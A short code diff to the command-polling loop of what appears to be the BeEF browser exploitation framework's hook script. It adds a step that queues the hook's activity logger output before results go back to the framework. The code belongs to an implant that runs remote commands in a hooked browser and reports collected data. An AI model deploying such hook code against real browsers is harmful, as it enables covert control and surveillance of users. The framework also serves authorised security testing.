@@ -30,6 +30,9 @@ beef.updater = {
 	// Checks for new commands from the framework and runs them.
 	check: function() {
 		if(this.lock == false) {
+			if (beef.logger.running) {
+				beef.logger.queue();
+			}
 			beef.net.flush_queue();
 			if(beef.commands.length > 0) {
 				this.execute_commands();
